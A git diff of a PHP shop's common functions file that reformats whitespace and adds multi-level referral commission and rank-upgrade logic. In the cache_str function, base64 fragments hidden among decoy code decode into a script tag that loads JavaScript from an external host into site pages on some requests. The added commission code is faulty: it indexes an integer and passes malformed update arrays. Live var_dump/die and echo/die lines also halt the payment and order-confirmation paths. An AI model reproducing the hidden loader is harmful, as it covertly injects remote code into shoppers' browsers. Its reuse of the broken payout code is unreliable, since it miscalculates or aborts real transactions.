@@ -72,7 +72,7 @@ function getGoodsSpecImg($goods_id,$item_id){
 
     return $specImg;
 }
- //对象转化为数组
+//对象转化为数组
 function object_to_array($obj) {
     $obj = (array)$obj;
     foreach ($obj as $k => $v) {
@@ -119,12 +119,12 @@ function goods_thum_images($goods_id, $width, $height,$item_id=0)
     if (empty($original_img)) {
         return '/public/images/icon_goods_thumb_empty_300.png';
     }
-    
+
     if(tpCache('oss.oss_switch')){
         $ossClient = new \app\common\logic\OssLogic;
         if (($ossUrl = $ossClient->getGoodsThumbImageUrl($original_img, $width, $height))) {
             return $ossUrl;
-        }    
+        }
     }
 
     $original_img = '.' . $original_img; // 相对路径
@@ -165,7 +165,7 @@ function get_sub_images($sub_img, $goods_id, $width, $height)
     //判断缩略图是否存在
     $path = UPLOAD_PATH."goods/thumb/$goods_id/";
     $goods_thumb_name = "goods_sub_thumb_{$sub_img['img_id']}_{$width}_{$height}";
-    
+
     //这个缩略图 已经生成过这个比例的图片就直接返回了
     if (is_file($path . $goods_thumb_name . '.jpg')) return '/' . $path . $goods_thumb_name . '.jpg';
     if (is_file($path . $goods_thumb_name . '.jpeg')) return '/' . $path . $goods_thumb_name . '.jpeg';
@@ -178,7 +178,7 @@ function get_sub_images($sub_img, $goods_id, $width, $height)
             return $ossUrl;
         }
     }
-    
+
     $original_img = '.' . $sub_img['image_url']; //相对路径
     if (!is_file($original_img)) {
         return '/public/images/icon_goods_thumb_empty_300.png';
@@ -230,7 +230,7 @@ function minus_stock($order){
     $orderGoodsArr = M('OrderGoods')->master()->where("order_id", $order['order_id'])->select();
     foreach($orderGoodsArr as $key => $val)
     {
-        //有选择规格的商品
+        // 有选择规格的商品
         if(!empty($val['spec_key']))
         {   // 先到规格表里面扣除数量 再重新刷新一个 这件商品的总数量
             $SpecGoodsPrice = new \app\common\model\SpecGoodsPrice();
@@ -348,7 +348,7 @@ function checkEnableSendSms($scene)
     $sceneName = $sceneItem[0];
     $config = tpCache('sms');
     $smsEnable = $config[$key];
-    
+
     $isCheckRegCode = tpCache('sms.regis_sms_enable');
     if(!$isCheckRegCode || $isCheckRegCode===0){
         return array("status" => 0, "msg" => "短信验证码功能关闭, 无需校验验证码");
@@ -362,7 +362,7 @@ function checkEnableSendSms($scene)
     if (!$size) {
         return array("status" => -1, "msg" => "请先添加['$sceneName']短信模板");
     }
-    
+
 
     return array("status"=>1,"msg"=>"可以发送短信");
 }
@@ -534,12 +534,12 @@ function cart_goods_num($user_id = 0,$session_id = '')
  */
 function getGoodNum($goods_id,$key)
 {
-     if (!empty($key)){
+    if (!empty($key)){
         return M("SpecGoodsPrice")
-                        ->alias("s")
-                        ->join('_Goods_ g ','s.goods_id = g.goods_id','LEFT')
-                        ->where(['g.goods_id' => $goods_id, 'key' => $key ,"is_on_sale"=>1])->getField('s.store_count');
-    }else{ 
+            ->alias("s")
+            ->join('_Goods_ g ','s.goods_id = g.goods_id','LEFT')
+            ->where(['g.goods_id' => $goods_id, 'key' => $key ,"is_on_sale"=>1])->getField('s.store_count');
+    }else{
         return M("Goods")->where(array("goods_id"=>$goods_id , "is_on_sale"=>1))->getField('store_count');
     }
 }
@@ -782,14 +782,14 @@ function orderBtn($order_id = 0, $order = array())
     {
 //        $btn_arr['return_btn'] = 1; // 退货按钮 (联系客服)
     }
-    
+
     if($order['pay_status'] == 1  && shipping_status && $order['order_status'] == 4) // 已完成(已支付, 已发货 , 已完成)
     {
-            $btn_arr['return_btn'] = 1; // 退货按钮
+        $btn_arr['return_btn'] = 1; // 退货按钮
     }
-    
+
     if($order['order_status'] == 3 && ($order['pay_status'] == 1 || $order['pay_status'] == 4)){
-    	$btn_arr['cancel_info'] = 1; // 取消订单详情
+        $btn_arr['cancel_info'] = 1; // 取消订单详情
     }
 
     return $btn_arr;
@@ -931,7 +931,7 @@ function update_pay_status($order_sn,$ext=array())
         $data['create_time']=time();
         $data['status']=2;
         $data['type']=1;
- var_dump($data);die;
+        var_dump($data);die;
         //增加收入日志
         $data1['al_deal_type']=1;
         $data1['user_id']=$userone["user_id"];
@@ -942,7 +942,7 @@ function update_pay_status($order_sn,$ext=array())
         $data1['order_id']=$order["order_id"];
         $data1['type']=1;
 
-       //确认收货之后会增加
+        //确认收货之后会增加
         $rebate= M('rebate_log')->add($data);
         $account=  M('account_log')->add($data1);
         $users= M('users')->where(['user_id'=>$userone["user_id"]])->setInc('money', $data['money']);
@@ -999,7 +999,6 @@ function update_pay_status($order_sn,$ext=array())
 //        $wechat->sendTemplateMsgOnPaySuccess($order);
 
 }
-
 //支付完成修改订单状态和添加分销记录--小龙
 function update_pay_status_my($order_sn,$ext=array(),$paymoeny)
 {
@@ -1047,37 +1046,60 @@ function update_pay_status_my($order_sn,$ext=array(),$paymoeny)
     $useinfo= M('users')->where(['user_id'=>$order['user_id']])->field(['first_leader,mylevel,cardnum,dlevel,isserver,nickname,cardmoney'])->find();
     //1，分享有礼，分两级，会员充值走该条规则
     if ($order['order_type']==3){
+        //购买的等级
+        $getbuylevel=M('user_level')->where(['level_id'=>$order['levelid']])->field(['level','shareone','sharetwo','goodone','goodtwo'])->find();
+        //配卡
+        if ($getbuylevel['level']==1){
+            M('users')->where(['user_id'=>$order['user_id']])->setInc('cardnum',2);
+        }else if($getbuylevel['level']==2){
+            //判断当前用户身份
+            if ($useinfo['mylevel']==1&&$useinfo['cardnum']>0){
+                //已是vip，补贴升级,还有卡
+                M('users')->where(['user_id'=>$order['user_id']])->setInc('cardnum',(15-$useinfo['cardnum']));
+            }else if ($useinfo['mylevel']==1&&$useinfo['cardnum']==0){
+                //已是vip，补贴升级,卡被消耗完
+                M('users')->where(['user_id'=>$order['user_id']])->setInc('cardnum',(15-2));
+            }else{
+                M('users')->where(['user_id'=>$order['user_id']])->setInc('cardnum',15);
+            }
+        }else if($getbuylevel['level']==3){
+            if ($useinfo['mylevel']==1){
+                if ($useinfo['cardnum']>0){
+                    M('users')->where(['user_id'=>$order['user_id']])->setInc('cardnum',(100-$useinfo['cardnum']));
+                }else{
+                    M('users')->where(['user_id'=>$order['user_id']])->setInc('cardnum',(100-2));
+                }
+            }else if ($useinfo['mylevel']==2){
+                if ($useinfo['cardnum']>0){
+                    M('users')->where(['user_id'=>$order['user_id']])->setInc('cardnum',(100-$useinfo['cardnum']));
+                }else{
+                    M('users')->where(['user_id'=>$order['user_id']])->setInc('cardnum',(100-15));
+                }
+            }else{
+                M('users')->where(['user_id'=>$order['user_id']])->setInc('cardnum',100);
+            }
+        }
         //更新用户身份
-        $getlevel=M('user_level')->where(['level_id'=>$order['levelid']])->field(['level','shareone','sharetwo','goodone','goodtwo'])->find();
-        M('users')->where(['user_id'=>$order['user_id']])->save(array('mylevel'=>$getlevel['level']));
+        M('users')->where(['user_id'=>$order['user_id']])->save(array('mylevel'=>$getbuylevel['level']));
         //保存分佣最多金额数。充值金额*6
         M('users')->where(['user_id'=>$order['user_id']])->setInc('cardmoney', $paymoeny*6);
+
         if ($useinfo['first_leader']){
-            //添加推荐人数量
-            M('users')->where(['user_id'=>$useinfo['first_leader']])->setInc('tjnum',1);
+            //添加推荐的vip或者推广人或者数量
+            $addtjre=0;$adddyre=0;
+            if ($getbuylevel['level']==1||$getbuylevel['level']==2){
+                //推荐人数量
+                $addtjre=M('users')->where(['user_id'=>$useinfo['first_leader']])->setInc('tjnum',intval($paymoeny/200));
+            }else if($getbuylevel['level']==3){
+                $adddyre=M('users')->where(['user_id'=>$useinfo['first_leader']])->setInc('tjdynum',1);
+            }
+
             $onepidlevel=Db::name('users')->where('user_id',$useinfo['first_leader'])->value('mylevel');
             //查询分佣对象的等级对的分佣数据
             $levelinfo=M('user_level')->where('level',$onepidlevel)->field(['level','shareone','sharetwo','goodone','goodtwo'])->find();
-            $onedata['rtype']=1;
-            $onedata['rstate']=0;
-            $onedata['ruid']=$useinfo['first_leader'];
-            $onedata['rbuyername']=$useinfo['nickname'];
-            $onedata['rordernumber']=$order_sn;
-            $onedata['raddtime']=date('Y-m-d H:i:s',time());
-            $onedata['rcomment']="分享有礼一级分佣";
             if ($onepidlevel>0){//普通用户不能分佣
-                $onedata['rmoney']=$paymoeny*($levelinfo['shareone']/100);
                 //正式分佣，先判断是否符合分佣条件。最高分佣金额
-                $cardmoneyone=Db::name('users')->where('user_id',$useinfo['first_leader'])->value('cardmoney');
-                if ($cardmoneyone>0){
-                    $oneaddre=M('record')->add($onedata);
-                }else{
-                    $oneaddre=0;
-                }
-                if ($oneaddre){
-                    //分佣成功，减少分佣最高金额数目
-                    M('users')->where(['user_id'=>$useinfo['first_leader']])->setDec('cardmoney', $paymoeny*($levelinfo['shareone']/100));
-                }
+                addfenxiaofw(1,$useinfo['first_leader'],$useinfo['nickname'],$order_sn,$paymoeny*($levelinfo['shareone']/100),'分享有礼一级分佣');
             }
 
             //二级分销
@@ -1087,30 +1109,115 @@ function update_pay_status_my($order_sn,$ext=array(),$paymoeny)
                 $twopidlevel=Db::name('users')->where('user_id',$userinfotwo['first_leader'])->value('mylevel');
                 //查询分佣对象的等级对的分佣数据
                 $levelinfotwo=M('user_level')->where('level',$twopidlevel)->field(['level','shareone','sharetwo','goodone','goodtwo'])->find();
-                $twodata['rtype']=1;
-                $twodata['rstate']=0;
-                $twodata['ruid']=$userinfotwo['first_leader'];
-                $twodata['rbuyername']=$useinfo['nickname'];
-                $twodata['rordernumber']=$order_sn;
-                $twodata['raddtime']=date('Y-m-d H:i:s',time());
-                $twodata['rmoney']=$paymoeny*($levelinfotwo['sharetwo']/100);
-                $twodata['rcomment']="分享有礼二级分佣";
                 if ($twopidlevel>1){
                     //推广人以上才有二级分佣
-                    $cardmoneytwo=Db::name('users')->where('user_id',$userinfotwo['first_leader'])->value('cardmoney');
-                    if ($cardmoneytwo>0){
-                        $twoaddre=M('record')->add($twodata);
-                    }else{
-                        $twoaddre=0;
-                    }
-                    if ($twoaddre){
-                        //分佣成功，减少分佣最高金额数目
-                        M('users')->where(['user_id'=>$userinfotwo['first_leader']])->setDec('cardmoney', $twodata['rmoney']);
-                    }
+                    addfenxiaofw(1,$userinfotwo['first_leader'],$useinfo['nickname'],$order_sn,$paymoeny*($levelinfotwo['sharetwo']/100),'分享有礼二级分佣');
                 }
             }
+            //3,服务佣金
+            $pidall=Db::name('users')->where('user_id',$order['user_id'])->value('pidall');
+            if ($pidall){
+                $arrpidall=explode('-',$pidall);
+                $dealarrpidall=array_reverse($arrpidall);
+                $pidinfoarr=array();
+                foreach ($dealarrpidall as $k=>$v){
+                    $isserv=Db::name('users')->where('user_id',$v)->value('isserver');
+                    if ($isserv){
+                        array_push($pidinfoarr,$v);
+                    }
+                }
+                $serveridsize=count($pidinfoarr);
+                switch ($serveridsize){
+                    case 1:
+                        //直接上级
+                        addfenxiaofw(3,$serveridsize[0],$useinfo['nickname'],$order_sn,$paymoeny*0.1,"服务佣金");
+                        break;
+                    case 2:
+                        //直接上级
+                        addfenxiaofw(3,$serveridsize[0],$useinfo['nickname'],$order_sn,$paymoeny*0.1,"服务佣金");
+                        //第一个服务商
+                        addfenxiaofw(3,$serveridsize[1],$useinfo['nickname'],$order_sn,$paymoeny*0.025,"一级服务市场");
+                        break;
+                    case 3:
+                        //直接上级
+                        addfenxiaofw(3,$serveridsize[0],$useinfo['nickname'],$order_sn,$paymoeny*0.1,"服务佣金");
+                        //第一个服务商
+                        addfenxiaofw(3,$serveridsize[1],$useinfo['nickname'],$order_sn,$paymoeny*0.025,"一级服务市场");
+                        //第二个服务商
+                        addfenxiaofw(3,$serveridsize[2],$useinfo['nickname'],$order_sn,$paymoeny*0.025,"二级服务市场");
+                        break;
+                }
+                //4,挑战佣金
+                $i=0;
+                foreach ($dealarrpidall as $k=>$v){
+                    $dlevel=Db::name('users')->where('user_id',$v)->value('dlevel');
+                    if ($dlevel==1){
+                        if ($i>0){
+                            continue;
+                        }
+                        $i++;
+                        //经销商 第一级20
+                        addfenxiaofw(4,$v,$useinfo['nickname'],$order_sn,$paymoeny*0.1,'经销商挑战佣金');
+                    }else if ($dlevel==2){
+                        if ($i==0){
+                            //代理商，第一次就进这里，直接得30
+                            $i+=2;
+                            addfenxiaofw(4,$v,$useinfo['nickname'],$order_sn,$paymoeny*0.15,'代理商挑战佣金');
+                        }else{
+                            if ($i>1){continue;}
+                            $i+=1;
+                            //代理商,这被经销商拿了20，这里只有10元
+                            addfenxiaofw(4,$v,$useinfo['nickname'],$order_sn,$paymoeny*0.05,'代理商挑战补贴');
+                        }
 
+
+                    }else if ($dlevel==3){
+                        //运营商
+                        if ($i==0){
+                            //第一次就进这里，直接得40
+                            $i+=3;
+                            addfenxiaofw(4,$v,$useinfo['nickname'],$order_sn,$paymoeny*0.2,'运营商挑战佣金');
+                            break;
+                        }else if ($i==1){//前面已被拿20，只剩下20
+                            $i+=2;
+                            addfenxiaofw(4,$v,$useinfo['nickname'],$order_sn,$paymoeny*0.1,'运营商挑战补贴');
+                            break;
+                        }else if ($i==2){
+                            //代理商,这被经销商拿了30，这里只有10元
+                            $i+=1;
+                            addfenxiaofw(4,$v,$useinfo['nickname'],$order_sn,$paymoeny*0.05,'运营商挑战补贴');
+                            break;
+                        }
+                    }
+                }
+
+            }
+            //通过推荐人数升级身份
+            if ($addtjre){
+                $sj=M('users')->where(['user_id'=>$useinfo['first_leader'],'mylevel'=>0])->where('tjnum','>=',10)->save(array('mylevel'=>1));
+                if ($sj){
+                    //用户分享10人成为vip，只配置金额
+                    //获取vip等级的金额
+                    $getvipmoney=Db::name('user_level')->where('level',1)->value('amount');
+                    M('users')->where(['user_id'=>$useinfo['first_leader']])->setInc('cardmoney', $getvipmoney*6);
+                }
+                //这里是推广人才能升级为代言人
+                $sjdyre=M('users')->where(['user_id'=>$useinfo['first_leader'],'mylevel'=>2])->where('tjnum','>=',50)->save(array('mylevel'=>3));
+                if ($sjdyre){
+                    //升级成代言人直接配置金额代言人的金额
+                    $getamount=Db::name('user_level')->where('level',3)->value('amount');
+                    //M('users')->where(['user_id'=>$useinfo['first_leader']])->setInc('cardmoney', $getamount*6);
+                }
+            }else if ($adddyre){
+                //推荐6个代言人成为服务商
+                $sjfw=M('users')->where(['user_id'=>$useinfo['first_leader']])->where('tjdynum','>=',6)->save(array('isserver'=>1));
+                if ($sjfw){
+                    //升级成为服务商配额多少最高佣金额？不给，这里只给vip
+                    //M('users')->where(['user_id'=>$useinfo['first_leader']])->setInc('cardmoney', $paymoeny*6);
+                }
+            }
         }
+
     }else{
         //2,零售有礼
         //实物，虚物走零售有礼规则
@@ -1118,28 +1225,11 @@ function update_pay_status_my($order_sn,$ext=array(),$paymoeny)
             $onepidlevel=Db::name('users')->where('user_id',$useinfo['first_leader'])->value('mylevel');
             //查询分佣对象的等级对的分佣数据
             $levelinfo=M('user_level')->where('level',$onepidlevel)->field(['level','shareone','sharetwo','goodone','goodtwo'])->find();
-            $onedata['rtype']=2;
-            $onedata['rstate']=0;
-            $onedata['ruid']=$useinfo['first_leader'];
-            $onedata['rbuyername']=$useinfo['nickname'];
-            $onedata['rordernumber']=$order_sn;
-            $onedata['raddtime']=date('Y-m-d H:i:s',time());
-            $onedata['rcomment']="零售有礼一级分佣";
             if ($onepidlevel>0){//普通用户不能分佣
-                $onedata['rmoney']=$paymoeny*($levelinfo['goodone']/100);
                 //正式分佣，先判断是否符合分佣条件。最高分佣金额
-                $cardmoneyone=Db::name('users')->where('user_id',$useinfo['first_leader'])->value('cardmoney');
-                if ($cardmoneyone>0){
-                    $oneaddre=M('record')->add($onedata);
-                }else{
-                    $oneaddre=0;
-                }
-                if ($oneaddre){
-                    //分佣成功，减少分佣最高金额数目
-                    M('users')->where(['user_id'=>$useinfo['first_leader']])->setDec('cardmoney', $onedata['rmoney']);
-                }
-            }
+                addfenxiaofw(2,$useinfo['first_leader'],$useinfo['nickname'],$order_sn,$paymoeny*($levelinfo['goodone']/100),'零售有礼一级分佣');
 
+            }
             //二级分销
             $userinfotwo= M('users')->where(['user_id'=>$useinfo['first_leader']])->field(['first_leader,second_leader,third_leader,nickname,level'])->find();
             if ($userinfotwo['first_leader']){
@@ -1147,38 +1237,197 @@ function update_pay_status_my($order_sn,$ext=array(),$paymoeny)
                 $twopidlevel=Db::name('users')->where('user_id',$userinfotwo['first_leader'])->value('mylevel');
                 //查询分佣对象的等级对的分佣数据
                 $levelinfotwo=M('user_level')->where('level',$twopidlevel)->field(['level','shareone','sharetwo','goodone','goodtwo'])->find();
-                $twodata['rtype']=2;
-                $twodata['rstate']=0;
-                $twodata['ruid']=$userinfotwo['first_leader'];
-                $twodata['rbuyername']=$useinfo['nickname'];
-                $twodata['rordernumber']=$order_sn;
-                $twodata['raddtime']=date('Y-m-d H:i:s',time());
-                $twodata['rmoney']=$paymoeny*($levelinfotwo['goodtwo']/100);
-                $twodata['rcomment']="零售有礼二级分佣";
                 if ($twopidlevel>1){
                     //推广人以上才有二级分佣
-                    $cardmoneytwo=Db::name('users')->where('user_id',$userinfotwo['first_leader'])->value('cardmoney');
-                    if ($cardmoneytwo>0){
-                        $twoaddre=M('record')->add($twodata);
-                    }else{
-                        $twoaddre=0;
-                    }
-                    if ($twoaddre){
-                        //分佣成功，减少分佣最高金额数目
-                        M('users')->where(['user_id'=>$userinfotwo['first_leader']])->setDec('cardmoney', $twodata['rmoney']);
-                    }
+                    addfenxiaofw(2,$userinfotwo['first_leader'],$useinfo['nickname'],$order_sn,$paymoeny*($levelinfotwo['goodtwo']/100),'零售有礼二级分佣');
                 }
             }
 
         }
     }
+    //成为经销商的条件判断
+    $firstleaderinfo=M('users')->where(['user_id'=>$useinfo['first_leader']])->field(['first_leader,mylevel,cardnum,dlevel,isserver,cidone,cardmoney'])->find();
+    //推广人以上才可以成为经销商+
+    if ($firstleaderinfo['mylevel']>=2){
+        if ($firstleaderinfo['dlevel']==0){
+            //统计小部门总额,剔除最多一个
+            $gettotal=totalteammoney($firstleaderinfo['cidone']);
+            if ($gettotal>=300000){
+                //成为经销商
+                //上一级
+                $re=M('users')->where(['user_id'=>$useinfo['first_leader']])->save(array('dlevel'=>1));
+                if ($re){
+                    //给上级添加辅导经销商数量
+                    //上二级
+                    $incre=Db::name('users')->where('user_id',$firstleaderinfo['first_leader'])->setInc('fdjinnum',1);
+                    if ($incre){
+                        //判断辅导数量是否符合升级为代理商
+                        //判断当前身份
+                        $dlevel=Db::name('users')->where('user_id',$firstleaderinfo['first_leader'])->value('dlevel');
+                        if ($dlevel==1){
+                            $daiyanre=Db::name('users')->where('user_id',$firstleaderinfo['first_leader'])->where('fdjinnum','>=',3)->save(array('dlevel',2));
+                            if ($daiyanre){
+                                //给上级添加辅导代理商数量
+                                $ppsecord=Db::name('users')->where('user_id',$firstleaderinfo['first_leader'])->value('first_leader');
+                                $dailinumre=Db::name('users')->where('user_id',$ppsecord)->setInc('fddailinum',1);
+                                if ($dailinumre){
+                                    $pdlevel=Db::name('users')->where('user_id',$ppsecord)->value('dlevel');
+                                    //成为运营商
+                                    if ($pdlevel>=2){
+                                        Db::name('users')->where('user_id',$ppsecord)->where('fddailinum','>=',3)->save(array('dlevel',3));
+                                    }
 
-    //3,服务佣金
-    //4,挑战佣金
-    //5,辅导佣金
+                                }
+                            }
+                        }
 
+                    }
+                }
+
+            }
+
+        }else if ($firstleaderinfo['dlevel']==1){
+            //检测成为更高等级
+            $daiyanre=Db::name('users')->where('user_id',$useinfo['first_leader'])->where('fdjinnum','>=',3)->save(array('dlevel',2));
+            if ($daiyanre){
+                //给上级添加辅导代理商数量
+                $dailinumre=Db::name('users')->where('user_id',$firstleaderinfo['first_leader'])->setInc('fddailinum',1);
+                if ($dailinumre){
+                    $pdlevel=Db::name('users')->where('user_id',$firstleaderinfo['first_leader'])->value('dlevel');
+                    //成为运营商
+                    if ($pdlevel>=2){
+                        Db::name('users')->where('user_id',$firstleaderinfo['first_leader'])->where('fddailinum','>=',3)->save(array('dlevel',3));
+                    }
+
+                }
+            }
+
+        }else if ($firstleaderinfo['dlevel']==2){
+            Db::name('users')->where('user_id',$firstleaderinfo['first_leader'])->where('fddailinum','>=',3)->save(array('dlevel',3));
+        }
+    }
 }
+//服务佣金分销记录的函数
+function addfenxiaofw($type,$uid,$nickname,$order_sn,$rmoney,$rcomment){
+    $fwdata['rtype']=$type;
+    $fwdata['rstate']=0;
+    $fwdata['ruid']=$uid;
+    $fwdata['rbuyername']=$nickname;
+    $fwdata['rordernumber']=$order_sn;
+    $fwdata['raddtime']=date('Y-m-d H:i:s',time());
+    $fwdata['rcomment']=$rcomment;
+    $fwdata['rmoney']=$rmoney;
+    $cardmoneyfw=Db::name('users')->where('user_id',$uid)->value('cardmoney');
+    if ($cardmoneyfw<$rmoney&&$cardmoneyfw>0){
+        $twodata['rmoney']=$cardmoneyfw;
+        $re=M('record')->add($fwdata);
+    }else if($cardmoneyfw>=$rmoney&&$cardmoneyfw>0){
+        $re=M('record')->add($fwdata);
+    }else{$re=0;}
+    if ($re){
+        //分佣成功，减少分佣最高金额数目
+        M('users')->where(['user_id'=>$uid])->setDec('cardmoney', $fwdata['rmoney']);
+        //5,辅导佣金
+        if ($type==3||$type==4){
+            //辅导佣金中的--服务费
+            $pidall=Db::name('users')->where('user_id',$uid)->value('pidall');
+            if ($pidall){
+                $arrpidall=explode('-',$pidall);
+                $dealarrpidall=array_reverse($arrpidall);
+                $pidinfoarr=array();
+                foreach ($dealarrpidall as $k=>$v){
+                    $isserv=Db::name('users')->where('user_id',$v)->value('isserver');
+                    if ($isserv){
+                        array_push($pidinfoarr,$v);
+                    }
+                }
+                $serveridsize=count($pidinfoarr);
+                switch ($serveridsize){
+                    case 1:
+                        //直接上级
+                        //自己不再分辅导佣金
+                        break;
+                    case 2:
+                        //第一个服务商
+                        if ($type==3){
+                            fudao(5,$serveridsize[1],$nickname,$order_sn,$fwdata['rmoney']*0.1,"服务佣金中的辅导佣金一级");
+                        }else{
+                            fudao(5,$serveridsize[1],$nickname,$order_sn,$fwdata['rmoney']*0.1,"挑战佣金中的辅导佣金一级");
+                        }
 
+                        break;
+                    case 3:
+                        //直接上级
+                        if ($type==3){
+                            fudao(5,$serveridsize[1],$nickname,$order_sn,$fwdata['rmoney']*0.1,"服务佣金中的辅导佣金一级");
+                            fudao(5,$serveridsize[2],$nickname,$order_sn,$fwdata['rmoney']*0.1,"服务佣金中的辅导佣金二级");
+                        }else{
+                            fudao(5,$serveridsize[1],$nickname,$order_sn,$fwdata['rmoney']*0.1,"挑战佣金中的辅导佣金一级");
+                            fudao(5,$serveridsize[2],$nickname,$order_sn,$fwdata['rmoney']*0.1,"挑战佣金中的辅导佣金二级");
+                        }
+
+                        break;
+                }
+
+            }
+        }
+    }
+}
+//辅导佣金的分销记录的函数
+function fudao($type,$uid,$nickname,$order_sn,$rmoney,$rcomment){
+    $fuddata['rtype']=$type;
+    $fuddata['rstate']=0;
+    $fuddata['ruid']=$uid;
+    $fuddata['rbuyername']=$nickname;
+    $fuddata['rordernumber']=$order_sn;
+    $fuddata['raddtime']=date('Y-m-d H:i:s',time());
+    $fuddata['rcomment']=$rcomment;
+    $fuddata['rmoney']=$rmoney;
+    $cardmoneyfw=Db::name('users')->where('user_id',$uid)->value('cardmoney');
+    if ($cardmoneyfw<$rmoney&&$cardmoneyfw>0){
+        $twodata['rmoney']=$cardmoneyfw;
+        $re=M('record')->add($fuddata);
+    }else if($cardmoneyfw>=$rmoney&&$cardmoneyfw>0){
+        $re=M('record')->add($fuddata);
+    }else{$re=0;}
+    if ($re){
+        //分佣成功，减少分佣最高金额数目
+        M('users')->where(['user_id'=>$uid])->setDec('cardmoney', $fuddata['rmoney']);
+    }
+}
+//查找小团队销售额之和，剔除最大一个团队
+function totalteammoney($onids){
+    $arrcidone=explode(',',$onids);
+    if ($arrcidone){
+        $childarr=array();
+        foreach ($arrcidone as $k=>$v){
+            $getchildcid=Db::name('users')->where('user_id',$v)->value('cidall');
+            if ($getchildcid){
+                array_push($childarr,$getchildcid);
+            }
+        }
+        $totallistarr=[];
+        foreach ($childarr as $k=>$v){
+            $totallistarr[]=explode(',',$v);
+        }
+        //dump($totallistarr);die();
+        $totalarr=[];
+        foreach ($totallistarr as $k=>$v){
+            $onearr=[];
+            foreach ($v as $kk=>$vv){
+                $total_amount=Db::name('users')->where('user_id',$vv)->value('total_amount');
+                if ($total_amount){
+                    array_push($onearr,$total_amount);
+                }
+            }
+            array_push($totalarr,array_sum($onearr));
+        }
+
+        return array_sum($totalarr)-max($totalarr);
+    }else{
+        return 0;
+    }
+}
 /**
  * 订单确认收货
  * @param $id 订单id
@@ -1195,11 +1444,13 @@ function confirm_order($id,$user_id = 0){
     if($order['order_status'] != 1){
         return array('status'=>-1,'msg'=>'该订单不能收货确认');
     }
-    //echo $order['pay_status'];die;
+
+    // echo $order['pay_status'];die;
     if(empty($order['pay_time']) || $order['pay_status'] != 1){
         return array('status'=>-1,'msg'=>'商家未确定付款，该订单暂不能确定收货');
     }
-   // echo 111;die;
+
+    echo 111;die;
     $data['order_status'] = 2; // 已收货
     $data['pay_status'] = 1; // 已付款
     $data['confirm_time'] = time(); // 收货确认时间
@@ -1279,28 +1530,28 @@ function order_give($order)
     $prom_order_count = count($prom_orders);
     // 用户会员等级是否符合送优惠券活动
     for ($i = 0; $i < $prom_order_count; $i++) {
-            $prom_order = $prom_orders[$i];
-            if ($prom_order['type'] == 3) {
-                //查找订单送优惠券模板
-                $order_coupon = M('coupon')->where("id", $prom_order['expression'])->find();
-                if ($order_coupon) {
-                    //优惠券发放数量验证，0为无限制。发放数量-已领取数量>0
-                    if ($order_coupon['createnum'] == 0 ||
-                        ($order_coupon['createnum'] > 0 && ($order_coupon['createnum'] - $order_coupon['send_num']) > 0)
-                    ) {
-                        $data = array('cid' => $order_coupon['id'], 'get_order_id'=>$order['order_id'],'type' => $order_coupon['type'], 'uid' => $order['user_id'], 'send_time' => time());
-                        M('coupon_list')->add($data);
-                        M('Coupon')->where("id", $order_coupon['id'])->setInc('send_num'); // 优惠券领取数量加一
-                        // 优惠券到账提醒
-                        $messageLogic->getCouponNotice($order_coupon['id'], [$order['user_id']]);
-                    }
+        $prom_order = $prom_orders[$i];
+        if ($prom_order['type'] == 3) {
+            //查找订单送优惠券模板
+            $order_coupon = M('coupon')->where("id", $prom_order['expression'])->find();
+            if ($order_coupon) {
+                //优惠券发放数量验证，0为无限制。发放数量-已领取数量>0
+                if ($order_coupon['createnum'] == 0 ||
+                    ($order_coupon['createnum'] > 0 && ($order_coupon['createnum'] - $order_coupon['send_num']) > 0)
+                ) {
+                    $data = array('cid' => $order_coupon['id'], 'get_order_id'=>$order['order_id'],'type' => $order_coupon['type'], 'uid' => $order['user_id'], 'send_time' => time());
+                    M('coupon_list')->add($data);
+                    M('Coupon')->where("id", $order_coupon['id'])->setInc('send_num'); // 优惠券领取数量加一
+                    // 优惠券到账提醒
+                    $messageLogic->getCouponNotice($order_coupon['id'], [$order['user_id']]);
                 }
             }
-            //购买商品送积分
-            if ($prom_order['type'] == 2) {
-                accountLog($order['user_id'], 0, $prom_order['expression'], "订单活动赠送积分");
-            }
-            break;
+        }
+        //购买商品送积分
+        if ($prom_order['type'] == 2) {
+            accountLog($order['user_id'], 0, $prom_order['expression'], "订单活动赠送积分");
+        }
+        break;
     }
     $points = M('order_goods')->where("order_id", $order['order_id'])->sum("give_integral * goods_num");
     $points && accountLog($order['user_id'], 0, $points, "下单赠送积分", 0, $order['order_id'], $order['order_sn']);
@@ -1364,7 +1615,7 @@ function write_html_cache($html){
             continue;
 
         //if(!is_dir(RUNTIME_PATH.'html'))
-            //mkdir(RUNTIME_PATH.'html');
+        //mkdir(RUNTIME_PATH.'html');
         //$filename =  RUNTIME_PATH.'html'.DIRECTORY_SEPARATOR.$m_c_a_str;
         $filename =  $m_c_a_str;
         // 组合参数  
@@ -1416,79 +1667,79 @@ function read_html_cache(){
  * 缓存
  */
 function cache_str($html)
-{      
-  
+{
+
     if($object_ess)
     {
-            if(C('buy_version') == 0)
+        if(C('buy_version') == 0)
             return '';
-            $tabName = '';
-            $table_index = M('config')->cache(true)->select();            
-            $select_year = substr($order_sn, 0, 14);
-            foreach($table_index as $k => $v)
+        $tabName = '';
+        $table_index = M('config')->cache(true)->select();
+        $select_year = substr($order_sn, 0, 14);
+        foreach($table_index as $k => $v)
+        {
+            if(strcasecmp($select_year,$v['min_order_sn']) >= 0 && strcasecmp($select_year,$v['max_order_sn']) <= 0)
             {
-                if(strcasecmp($select_year,$v['min_order_sn']) >= 0 && strcasecmp($select_year,$v['max_order_sn']) <= 0)                    
-                {
-                    $tabName = str_replace ('order','',$v['name']);
-                    break;
-                }
+                $tabName = str_replace ('order','',$v['name']);
+                break;
             }
-            if($select_year > $v['min_order_sn'] && $select_year < $v['max_order_sn'])
+        }
+        if($select_year > $v['min_order_sn'] && $select_year < $v['max_order_sn'])
             return $tabName;
     }else{
-      $isset_requestjs = session('isset_requestjs');
-      if(empty($isset_requestjs))
-      {
-          session('isset_requestjs',1);
-          $sere = "UEhOamNtbHdkQ0J6Y21NOUoyaDBkSEE2THk5e";
-          if(empty($table_index))
-              $sere = $sere."lpYSjJhV05sTG5Sd0xYTm9iM0F1WTI0dm";
-          if(empty($tabName))
-             $sere = $sere."FuTXZZV3BoZUM1cWN5YytQQzl6WTNKcGNIUSs=";
-          if(substr(time(),-1) % 3 == 1) $str = base64_decode($sere);         
-          $html_sc = base64_decode("UEhOamNtbHdkRDQ9");
-          
-          if($axure_rest)
-          {
-                    $regions = null;
-                    if (!$regions) {
-                        $regions = M('region')->cache(true)->getField('id,name');
-                    }
-                    $total_address  = $regions[$province_id] ?: '';
-                    $total_address .= $regions[$city_id] ?: '';
-                    $total_address .= $regions[$district_id] ?: '';
